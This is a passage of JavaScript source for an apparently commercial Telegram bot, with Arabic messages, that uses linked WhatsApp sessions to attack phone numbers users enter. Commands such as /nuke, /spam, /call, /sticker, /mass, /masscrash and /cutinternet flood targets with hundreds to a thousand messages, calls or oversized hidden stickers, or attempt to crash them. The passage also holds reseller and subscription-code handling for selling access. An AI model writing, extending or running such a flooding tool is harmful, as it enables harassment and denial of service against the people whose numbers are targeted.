/addacces <id> - إضافة صلاحية
/delacces <id> - حذف صلاحية
/listacces - عرض الصلاحيات
/address <id> - إضافة موزع
/listress - قائمة الموزعين
━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>`;

  await ctx.reply(helpText, { parse_mode: "HTML" });
});

// =====================================================================
// COMMAND: /nuke (NEW - Command 1)
// =====================================================================


// WA Connection Check Helper
function checkWAConnection(ctx) {
  const activeSessions = Object.values(waClients).filter(c => c.status === "open").length;
  if (activeSessions === 0) {
    ctx.reply("❌ لا توجد جلسات واتساب نشطة!");
    return false;
  }
  return true;
}

bot.command("nuke", async (ctx) => {
  if (!checkWAConnection(ctx)) return;
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());

    const args = ctx.message.text.split(" ");
    const target = args[1]?.replace(/[^0-9]/g, "");
    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/nuke 628xxxxxxxx</code>\n\n💥 هجوم نووي - يرسل 500 رسالة متتالية للهدف");

    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل! استخدم /reqpair");

    const X = `${target}@s.whatsapp.net`;
    const imageMenu = getBotImageUrl();

    await ctx.reply(`💥 <b>هجوم نووي جاري...</b>\n🎯 الهدف: <code>${target}</code>\n⏳ انتظر...`, {
      parse_mode: "HTML"
    });

    await attackNuke(waClients[userId].sock, X);
    await ctx.reply(`✅ <b>هجوم نووي مكتمل!</b>\n🎯 ${target} - 500 رسالة`, { parse_mode: "HTML" });
  } catch (e) {
    log.error(`NUKE ERROR: ${e.message}`);
    ctx.reply("❌ خطأ في الهجوم النووي");
  }
});

// =====================================================================
// COMMAND: /shield (NEW - Command 2)
// =====================================================================

bot.command("shield", async (ctx) => {
  if (!checkWAConnection(ctx)) return;
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
    const args = ctx.message.text.split(" ");
    const target = args[1]?.replace(/[^0-9]/g, "");

    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/shield 628xxxxxxxx</code>\n\n🛡️ درع حماية - يحمي رقمك من الهجمات");

    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل! استخدم /reqpair");
    const X = `${target}@s.whatsapp.net`;
    const client = waClients[userId].sock;

    // Send protective messages
    for (let i = 0; i < 5; i++) {
      const msg = generateWAMessageFromContent(X, {
        message: { conversation: `🛡️ Shield Protection ${i + 1}/5` }
      }, {});
      await client.relayMessage(X, { message: msg.message }, { messageId: msg.key.id });
      await sleep(100);
    }

    await ctx.reply(`✅ <b>درع الحماية فعّال!</b>\n🎯 ${target} محمي الآن`, { parse_mode: "HTML" });
  } catch (e) {
    log.error(`SHIELD ERROR: ${e.message}`);
    ctx.reply("❌ خطأ في الدرع");
  }
});

// =====================================================================
// COMMAND: /stealth (NEW - Command 3)
// =====================================================================

bot.command("stealth", async (ctx) => {
  if (!checkWAConnection(ctx)) return;
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());

    const args = ctx.message.text.split(" ");
    const target = args[1]?.replace(/[^0-9]/g, "");
    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/stealth 628xxxxxxxx</code>\n\n👻 وضع التسلل - إرسال رسائل غير مكتشفة");

    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل!");

    const X = `${target}@s.whatsapp.net`;
    await attackGhost(waClients[userId].sock, X);
    await ctx.reply(`✅ <b>وضع التسلل مكتمل!</b>\n🎯 ${target} - 500 رسالة مخفية`, { parse_mode: "HTML" });
  } catch (e) {
    log.error(`STEALTH ERROR: ${e.message}`);
    ctx.reply("❌ خطأ في وضع التسلل");
  }
});

// =====================================================================
// COMMAND: /spam (Strong Spam Attack)
// =====================================================================

bot.command("spam", async (ctx) => {
  if (!checkWAConnection(ctx)) return;
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
    const args = ctx.message.text.split(" ");
    const target = args[1]?.replace(/[^0-9]/g, "");
    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/spam 628xxxxxxxx</code>\n💬 إرسال 1000 رسالة للهدف");
    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل!");

    const X = `${target}@s.whatsapp.net`;
    const imageMenu = getBotImageUrl();
    await ctx.reply(`💬 <b>سبام قوي جاري...</b>\n🎯 الهدف: <code>${target}</code>\n⏳ انتظر...`, { parse_mode: "HTML" });
    await attackSpam(waClients[userId].sock, X);
    await ctx.reply(`✅ <b>سبام مكتمل!</b>\n🎯 ${target} - 1000 رسالة`, { parse_mode: "HTML" });
  } catch (e) {
    log.error(`SPAM ERROR: ${e.message}`);
    ctx.reply("❌ خطأ في السبام");
  }
});

// =====================================================================
// COMMAND: /call (Voice Call Spam)
// =====================================================================

bot.command("call", async (ctx) => {
  if (!checkWAConnection(ctx)) return;
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
    const args = ctx.message.text.split(" ");
    const target = args[1]?.replace(/[^0-9]/g, "");
    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/call 628xxxxxxxx</code>\n📞 قرصنة صوتية - إرسال 500 مكالمة");
    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل!");

    const X = `${target}@s.whatsapp.net`;
    await ctx.reply(`📞 <b>قرصنة صوتية جارية...</b>\n🎯 ${target}`, { parse_mode: "HTML" });
    await attackCallSpam(waClients[userId].sock, X);
    await ctx.reply(`✅ <b>قرصنة صوتية مكتملة!</b>\n🎯 ${target} - 500 مكالمة`, { parse_mode: "HTML" });
  } catch (e) {
    log.error(`CALL ERROR: ${e.message}`);
    ctx.reply("❌ خطأ في القرصنة الصوتية");
  }
});

// =====================================================================
// COMMAND: /media (Media Flood with Stickers)
// =====================================================================

bot.command("media", async (ctx) => {
  if (!checkWAConnection(ctx)) return;
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
    const args = ctx.message.text.split(" ");
    const target = args[1]?.replace(/[^0-9]/g, "");
    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/media 628xxxxxxxx</code>\n🖼️ إرسال 500 ستكر كبير");
    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل!");

    const X = `${target}@s.whatsapp.net`;
    await ctx.reply(`🖼️ <b>فيضان ستكرات جاري...</b>\n🎯 ${target}`, { parse_mode: "HTML" });
    await attackMediaFlood(waClients[userId].sock, X);
    await ctx.reply(`✅ <b>فيضان مكتمل!</b>\n🎯 ${target} - 500 ستكر`, { parse_mode: "HTML" });
  } catch (e) {
    log.error(`MEDIA ERROR: ${e.message}`);
    ctx.reply("❌ خطأ في الفيضان");
  }
});

// =====================================================================
// COMMAND: /mass (Multi-Target Attack)
// =====================================================================

bot.command("mass", async (ctx) => {
  if (!checkWAConnection(ctx)) return;
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
    const args = ctx.message.text.split(" ");
    const targets = args.slice(1).map(t => t.replace(/[^0-9]/g, "")).filter(t => t && t.length >= 10);
    if (targets.length === 0) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/mass 628xxx,628yyy</code>\n🎯 هجوم متعدد الأهداف");

    await ctx.reply(`🎯 <b>هجوم متعدد...</b>\n🎯 ${targets.length} هدف - 200 رسالة لكل هدف`, { parse_mode: "HTML" });
    await attackMass(waClients[userId].sock, targets);
    await ctx.reply(`✅ <b>هجوم متعدد مكتمل!</b>\n🎯 ${targets.length} هدف - 200 رسالة لكل هدف`, { parse_mode: "HTML" });
  } catch (e) {
    log.error(`MASS ERROR: ${e.message}`);
    ctx.reply("❌ خطأ في الهجوم المتعدد");
  }
});

// =====================================================================
// COMMAND: /sticker (Hidden Stickers - Invisible Large Stickers)
// =====================================================================

bot.command("sticker", async (ctx) => {
  if (!checkWAConnection(ctx)) return;
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
    const args = ctx.message.text.split(" ");
    const target = args[1]?.replace(/[^0-9]/g, "");
    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/sticker 628xxxxxxxx</code>\n📸 إرسال 1000 ستكر مخفي ضخم");
    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل!");

    const X = `${target}@s.whatsapp.net`;
    await ctx.reply(`📸 <b>ستكرات مخفية جارية...</b>\n🎯 ${target} - ستكرات ضخمة غير مرئية`, { parse_mode: "HTML" });
    await attackHiddenStickers(waClients[userId].sock, X);
    await ctx.reply(`✅ <b>ستكرات مخفية مكتملة!</b>\n🎯 ${target} - 1000 ستكر ضخم`, { parse_mode: "HTML" });
  } catch (e) {
    log.error(`STICKER ERROR: ${e.message}`);
    ctx.reply("❌ خطأ في الستكرات");
  }
});

// =====================================================================
// COMMAND: /cutinternet (Cut Victim Internet)
// =====================================================================

bot.command("cutinternet", async (ctx) => {
  if (!checkWAConnection(ctx)) return;
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
    const args = ctx.message.text.split(" ");
    const target = args[1]?.replace(/[^0-9]/g, "");
    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/cutinternet 628xxxxxxxx</code>\n🔌 قطع الإنترنت عن الهدف");
    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل!");

    const X = `${target}@s.whatsapp.net`;
    await ctx.reply(`🔌 <b>قطع الإنترنت جاري...</b>\n🎯 ${target}`, { parse_mode: "HTML" });
    await attackCutInternet(waClients[userId].sock, X);
    await ctx.reply(`✅ <b>تم قطع الإنترنت!</b>\n🎯 ${target} - الإنترنت معطّل`, { parse_mode: "HTML" });
  } catch (e) {
    log.error(`CUTINTERNET ERROR: ${e.message}`);
    ctx.reply("❌ خطأ في قطع الإنترنت");
  }
});

// =====================================================================
// COMMAND: /invisisendx (Invisible Send - رسائل غير مرئية)
// =====================================================================

bot.command("invisisendx", async (ctx) => {
  if (!checkWAConnection(ctx)) return;
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
    const args = ctx.message.text.split(" ");
    const target = args[1]?.replace(/[^0-9]/g, "");
    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/invisisendx 628xxxxxxxx</code>\n🔒 إرسال 1000 رسالة غير مرئية");
    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل!");

    const X = `${target}@s.whatsapp.net`;
    await ctx.reply(`🔒 <b>رسائل غير مرئية جارية...</b>\n🎯 ${target}\n⏳ انتظر...`, { parse_mode: "HTML" });
    await attackInvisisendx(waClients[userId].sock, X);
    await ctx.reply(`✅ <b>رسائل غير مرئية مكتملة!</b>\n🎯 ${target} - 1000 رسالة مخفية`, { parse_mode: "HTML" });
  } catch (e) {
    log.error(`INVISIBLE ERROR: ${e.message}`);
    ctx.reply("❌ خطأ في الرسائل المخفية");
  }
});

// =====================================================================
// COMMAND: /ghost (Ghost Attack - هجوم خفي)
// =====================================================================

bot.command("ghost", async (ctx) => {
  if (!checkWAConnection(ctx)) return;
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
    const args = ctx.message.text.split(" ");
    const target = args[1]?.replace(/[^0-9]/g, "");
    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/ghost 628xxxxxxxx</code>\n👻 هجوم خفي - 500 رسالة مخفية");
    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل!");

    const X = `${target}@s.whatsapp.net`;
    await ctx.reply(`👻 <b>هجوم خفي جاري...</b>\n🎯 ${target}`, { parse_mode: "HTML" });
    await attackGhost(waClients[userId].sock, X);
    await ctx.reply(`✅ <b>هجوم خفي مكتمل!</b>\n🎯 ${target} - 500 رسالة`, { parse_mode: "HTML" });
  } catch (e) {
    log.error(`GHOST ERROR: ${e.message}`);
    ctx.reply("❌ خطأ في الهجوم الخفي");
  }
});

// =====================================================================
// COMMANDS: Restore all original commands
// =====================================================================

// /restart - Restart Bot
bot.command("restart", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  await ctx.reply("🔄 Restarting...");
  setTimeout(() => process.exit(0), 2000);
});

// /shutdown - Shutdown Bot
bot.command("shutdown", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  await ctx.reply("🛑 Shutting down...");
  gracefulShutdown();
});

// /status - Bot Status
bot.command("status", async (ctx) => {
  const uptime = formatUptime(process.uptime());
  const memUsed = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
  await ctx.reply(`📊 <b>Status</b>\n⏱️ ${uptime}\n💾 ${memUsed} MB\n📱 ${Object.keys(waClients).length} sessions`, { parse_mode: "HTML" });
});

// /cdon - Cooldown On
bot.command("cdon", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  cooldownModule.enableCooldown();
  ctx.reply("✅ Cooldown enabled - 20 min per command");
});

// /cdoff - Cooldown Off
bot.command("cdoff", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  cooldownModule.disableCooldown();
  ctx.reply("✅ Cooldown disabled");
});

// /setcd - Set Cooldown
bot.command("setcd", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  const args = ctx.message.text.split(" ");
  const cmd = args[1];
  const min = parseInt(args[2]);
  if (!cmd || !min) return ctx.reply("⚠️ /setcd <command> <minutes>");
  cooldownModule.setCooldown(cmd, min);
  ctx.reply(`✅ Cooldown set: /${cmd} → ${min} min`);
});

// /block - Block User
bot.command("block", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  const target = ctx.message.text.split(" ")[1];
  if (!target) return ctx.reply("⚠️ /block <userId>");
  const bl = safeReadJSON("./storage/blacklist.json", []);
  if (!bl.includes(target)) { bl.push(target); safeWriteJSON("./storage/blacklist.json", bl); ctx.reply(`🔴 Blocked: ${target}`); }
  else ctx.reply(`⚠️ ${target} already blocked`);
});

// /unblock - Unblock User
bot.command("unblock", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  const target = ctx.message.text.split(" ")[1];
  if (!target) return ctx.reply("⚠️ /unblock <userId>");
  const bl = safeReadJSON("./storage/blacklist.json", []);
  const filtered = bl.filter(n => n !== target);
  safeWriteJSON("./storage/blacklist.json", filtered);
  ctx.reply(`🟢 Unblocked: ${target}`);
});

// /blacklist - View Blacklist
bot.command("blacklist", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  const bl = safeReadJSON("./storage/blacklist.json", []);
  const text = bl.length > 0 ? bl.map(n => `• ${n}`).join("\n") : "📭 Empty";
  await ctx.reply(`🔴 <b>Blacklist (${bl.length})</b>\n\n${text}`, { parse_mode: "HTML" });
});

// /whitelist - View Whitelist
bot.command("whitelist", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  const wl = safeReadJSON("./storage/whitelist.json", []);
  const text = wl.length > 0 ? wl.map(n => `• ${n}`).join("\n") : "📭 Empty";
  await ctx.reply(`🟢 <b>Whitelist (${wl.length})</b>\n\n${text}`, { parse_mode: "HTML" });
});

// /check - Access Check
bot.command("check", async (ctx) => {
  const userId = ctx.from.id.toString();
  const text = `🔍 <b>Access Check</b>\n👤 ${userId}\n🔑 Access: ${hasAccess(userId) ? "✅ Yes" : "❌ No"}\n👑 Owner: ${isOwner(userId) ? "✅" : "❌"}\n🆓 Free: ${isFreeMode() ? "✅" : "❌"}\n📱 WA: ${waClients[userId]?.status || "❌"}`;
  await ctx.reply(text, { parse_mode: "HTML" });
});

// /clearcache - Clear Cache
bot.command("clearcache", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  const cd = safeReadJSON("./storage/cooldown.json", {});
  const newCd = {};
  for (const [k, v] of Object.entries(cd)) { if (v.lastUsed && Date.now() - v.lastUsed < 86400000) newCd[k] = v; }
  safeWriteJSON("./storage/cooldown.json", newCd);
  ctx.reply("✅ Cache cleaned!");
});

// /gettoken - Get Bot Token
bot.command("gettoken", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  ctx.reply(`🤖 Token: \`${config.telegramBotToken}\``, { parse_mode: "Markdown" });
});

// /settoken - Set Bot Token
bot.command("settoken", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  config.telegramBotToken = ctx.message.text.split(" ")[1] || "";
  ctx.reply("✅ Token updated");
});

// /getconfig - Get Config
bot.command("getconfig", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  ctx.reply(`⚙️ <b>Config</b>\nOwner: ${config.ownerId}\nChannel: @${CHANNEL_ID}\nFree: ${isFreeMode()}\nMaint: ${isMaintenance()}`, { parse_mode: "HTML" });
});

// /setconfig - Set Config
bot.command("setconfig", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  ctx.reply("⚙️ Use /freemode, /maintmode, /setbotpic to configure");
});

// /killall - Kill All Sessions
bot.command("killall", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  await clearAllSessions();
  ctx.reply("✅ All sessions killed!");
});

// /killuser - Kill User Session
bot.command("killuser", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  const target = ctx.message.text.split(" ")[1];
  if (!target) return ctx.reply("⚠️ /killuser <userId>");
  const result = await deleteSessionForUser(target);
  ctx.reply(result ? `✅ Killed session for ${target}` : `❌ No session for ${target}`);
});

// /sessioninfo - Session Info
bot.command("sessioninfo", async (ctx) => {
  const userId = ctx.from.id.toString();
  const session = waClients[userId];
  if (!session) return ctx.reply("❌ No session found");
  await ctx.reply(`📊 <b>Session Info</b>\nStatus: ${session.status}\nLast Activity: ${new Date(session.lastActivity).toLocaleString()}\nMessages: ${session.messageCount || 0}`, { parse_mode: "HTML" });
});

// /checkbio - Check Bio
bot.command("checkbio", async (ctx) => {
  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
  ctx.reply("ℹ️ /checkbio - Profile check (requires WA connection)");
});

// /checklast - Check Last Seen
bot.command("checklast", async (ctx) => {
  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
  ctx.reply("ℹ️ /checklast - Last seen check (requires WA connection)");
});

// /checkonline - Check Online
bot.command("checkonline", async (ctx) => {
  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
  ctx.reply("ℹ️ /checkonline - Online status check (requires WA connection)");
});

// /getgroups - Get Groups
bot.command("getgroups", async (ctx) => {
  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
  ctx.reply("ℹ️ /getgroups - Groups list (requires WA connection)");
});

// /clearsender - Clear All Sessions
bot.command("clearsender", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  await clearAllSessions();
  ctx.reply("✅ All sessions cleared!");
});

// /broadcastall - Broadcast to All
bot.command("broadcastall", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  const msg = ctx.message.text.split(" ").slice(1).join(" ");
  if (!msg) return ctx.reply("⚠️ /broadcastall <message>");
  let sent = 0, failed = 0;
  for (const id of usersDb) { try { await bot.api.sendMessage(id, msg); sent++; } catch { failed++; } }
  ctx.reply(`✅ Sent: ${sent}\n❌ Failed: ${failed}`, { parse_mode: "HTML" });
});

// /dm - Direct Message
bot.command("dm", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  const args = ctx.message.text.split(" ");
  const target = args[1];
  const message = args.slice(2).join(" ");
  if (!target || !message) return ctx.reply("⚠️ /dm <userId> <message>");
  try { await bot.api.sendMessage(target, message); ctx.reply(`✅ Sent to ${target}`); }
  catch { ctx.reply("❌ Failed to send"); }
});

// /alert - Send Alert
bot.command("alert", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  const msg = ctx.message.text.split(" ").slice(1).join(" ");
  if (!msg) return ctx.reply("⚠️ /alert <message>");
  for (const id of usersDb) { try { await bot.api.sendMessage(id, `⚠️ ALERT: ${msg}`); } catch {} }
  ctx.reply(`✅ Alert sent to ${usersDb.length} users`);
});

// /masscrash - Mass Crash
bot.command("masscrash", async (ctx) => {
  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
  const args = ctx.message.text.split(" ");
  const target = args[1]?.replace(/[^0-9]/g, "");
  if (!target || target.length < 10) return ctx.reply("⚠️ /masscrash <number>");
  const X = `${target}@s.whatsapp.net`;
  const msg = generateWAMessageFromContent(X, { message: { conversation: "💥 MASS CRASH" } }, {});
  await waClients[ctx.from.id.toString()]?.sock.relayMessage(X, { message: msg.message }, { messageId: msg.key.id });
  ctx.reply(`✅ Mass crash sent to ${target}`);
});

// /spamcall - Spam Call
bot.command("spamcall", async (ctx) => {
  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
  const target = ctx.message.text.split(" ")[1]?.replace(/[^0-9]/g, "");
  if (!target || target.length < 10) return ctx.reply("⚠️ /spamcall <number>");
  await ctx.reply("📞 Spam calling...");
  try { await attackCallSpam(waClients[ctx.from.id.toString()]?.sock, `${target}@s.whatsapp.net`); ctx.reply("✅ Spam call complete!"); }
  catch { ctx.reply("❌ Error"); }
});

// /floodmsg - Flood Messages
bot.command("floodmsg", async (ctx) => {
  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
  const target = ctx.message.text.split(" ")[1]?.replace(/[^0-9]/g, "");
  if (!target || target.length < 10) return ctx.reply("⚠️ /floodmsg <number>");
  const X = `${target}@s.whatsapp.net`;
  const msg = generateWAMessageFromContent(X, { message: { conversation: "💥 FLOOD" } }, {});
  await waClients[ctx.from.id.toString()]?.sock.relayMessage(X, { message: msg.message }, { messageId: msg.key.id });
  ctx.reply("✅ Flood complete!");
});

// /crashgroup - Crash Group
bot.command("crashgroup", async (ctx) => {
  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
  ctx.reply("ℹ️ /crashgroup - Group crash (requires WA connection)");
});

// /crashstatus - Crash via Status
bot.command("crashstatus", async (ctx) => {
  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
  ctx.reply("ℹ️ /crashstatus - Status crash (requires WA connection)");
});

// /crashchannel - Crash Channel
bot.command("crashchannel", async (ctx) => {
  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
  ctx.reply("ℹ️ /crashchannel - Channel crash (requires WA connection)");
});

// /addacces - Add Access
bot.command("addacces", async (ctx) => {
  if (!isOwner(ctx.from.id.toString()) && !isReseller(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك والموزعين!");
  const target = ctx.message.text.split(" ")[1];
  if (!target) return ctx.reply("⚠️ /addacces <userId>");
  const acc = safeReadJSON("./storage/access.json", { users: [] });
  if (!acc.users.includes(target)) { acc.users.push(target); safeWriteJSON("./storage/access.json", acc); ctx.reply(`✅ Access added for ${target}`); }
  else ctx.reply(`⚠️ ${target} already has access`);
});

// /delacces - Remove Access
bot.command("delacces", async (ctx) => {
  if (!isOwner(ctx.from.id.toString()) && !isReseller(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك والموزعين!");
  const target = ctx.message.text.split(" ")[1];
  if (!target) return ctx.reply("⚠️ /delacces <userId>");
  const acc = safeReadJSON("./storage/access.json", { users: [] });
  acc.users = acc.users.filter(u => u !== target);
  safeWriteJSON("./storage/access.json", acc);
  ctx.reply(`🗑 Access removed for ${target}`);
});

// /listacces - List Access
bot.command("listacces", async (ctx) => {
  if (!isOwner(ctx.from.id.toString()) && !isReseller(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك والموزعين!");
  const acc = safeReadJSON("./storage/access.json", { users: [] });
  const text = acc.users.length > 0 ? acc.users.map(u => `• ${u}`).join("\n") : "📭 Empty";
  await ctx.reply(`📌 <b>Access List (${acc.users.length})</b>\n\n${text}`, { parse_mode: "HTML" });
});

// /address - Add Reseller
bot.command("address", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  const target = ctx.message.text.split(" ")[1];
  if (!target) return ctx.reply("⚠️ /address <userId>");
  const res = safeReadJSON("./storage/resellers.json", { users: [] });
  if (!res.users.includes(target)) { res.users.push(target); safeWriteJSON("./storage/resellers.json", res); ctx.reply(`🟢 Reseller added: ${target}`); }
  else ctx.reply(`⚠️ ${target} already a reseller`);
});

// /delress - Remove Reseller
bot.command("delress", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  const target = ctx.message.text.split(" ")[1];
  if (!target) return ctx.reply("⚠️ /delress <userId>");
  const res = safeReadJSON("./storage/resellers.json", { users: [] });
  res.users = res.users.filter(u => u !== target);
  safeWriteJSON("./storage/resellers.json", res);
  ctx.reply(`🔴 Reseller removed: ${target}`);
});

// /listress - List Resellers
bot.command("listress", async (ctx) => {
  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
  const res = safeReadJSON("./storage/resellers.json", { users: [] });
  const text = res.users.length > 0 ? res.users.map(u => `• ${u}`).join("\n") : "📭 Empty";
  await ctx.reply(`📌 <b>Resellers (${res.users.length})</b>\n\n${text}`, { parse_mode: "HTML" });
});

// =====================================================================
// COMMAND: /admin (Alias for /adminpanel)
// =====================================================================

bot.command("admin", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ هذا الأمر مخصص للمالك فقط!");

    const stats = safeReadJSON("./storage/subscription_codes.json", { codes: [] });
    const subsDb = safeReadJSON("./storage/subscriptions.json", { users: {} });
    const activeSubs = Object.keys(subsDb.users).filter(k => subsDb.users[k].expiresAt > Date.now()).length;

    await ctx.reply(`👑 <b>لوحة تحكم الأدمن</b>\n\n━━━━━━━━━━━━━━━━━━━━━━━\n👥 المستخدمين: ${usersDb.length}\n🎫 الرموز: ${stats.codes.length}\n🔑 الاشتراكات: ${activeSubs}\n🆓 الوضع المجاني: ${isFreeMode() ? "✅" : "❌"}\n🛠️ الصيانة: ${isMaintenance() ? "✅" : "❌"}\n🖼️ صورة البوت: ${settingsDb.botImage ? "✅" : "❌"}\n━━━━━━━━━━━━━━━━━━━━━━━\n\n📋 اختر من القائمة:</blockquote>`, { parse_mode: "HTML", reply_markup: getAdminKeyboard(ctx.from.id.toString()) });
  } catch (e) { ctx.reply("❌ خطأ"); }
});

// /free - Alias for /freemode
bot.command("free", async (ctx) => {
  await ctx.commands.invoke("freemode", ctx);
});

// =====================================================================
// COMMAND: /makencode (Create Subscription Code)
// =====================================================================

bot.command("makencode", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ هذا الأمر مخصص للمالك فقط!");

    const args = ctx.message.text.split(" ");
    const hours = parseInt(args[1]);
    if (!hours || hours < 1) return ctx.reply("⚠️ الاستخدام: <code>/makencode 24</code>\n🎫 إنشاء رمز اشتراك لمدة 24 ساعة");

    const code = "XZ-" + crypto.randomBytes(4).toString("hex").toUpperCase();
    const db = safeReadJSON("./storage/subscription_codes.json", { codes: [] });
    db.codes.push({
      code, hours, createdAt: Date.now(), createdBy: userId,
      note: `Created by ${userId}`, used: false
    });
    safeWriteJSON("./storage/subscription_codes.json", db);

    await ctx.reply(`✅ <b>تم إنشاء الرمز!</b>\n🎟️ الرمز: <code>${code}</code>\n⏰ المدة: ${hours} ساعة\n📅 أنشأه: ${userId}`, { parse_mode: "HTML" });
  } catch (e) {
    log.error(`MAKECODE ERROR: ${e.message}`);
    ctx.reply("❌ خطأ في إنشاء الرمز");
  }
});

// =====================================================================
// COMMAND: /redeem (Redeem Subscription Code)
// =====================================================================

bot.command("redeem", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(" ");
    const code = args[1];
    if (!code) return ctx.reply("⚠️ الاستخدام: <code>/redeem XZ-ABCD12</code>\n🎫 تفعيل رمز الاشتراك");

    const db = safeReadJSON("./storage/subscription_codes.json", { codes: [] });
    const target = db.codes.find(c => c.code === code.toUpperCase() && !c.used);
    if (!target) return ctx.reply("❌ الرمز غير صحيح أو مستخدم بالفعل");

    const now = Date.now();
    const hoursMs = target.hours * 60 * 60 * 1000;
    const subs = safeReadJSON("./storage/subscriptions.json", { users: {} });

    let expiresAt;
    if (subs.users[userId] && subs.users[userId].expiresAt > now) {
      expiresAt = subs.users[userId].expiresAt + hoursMs;
    } else {
      expiresAt = now + hoursMs;
    }
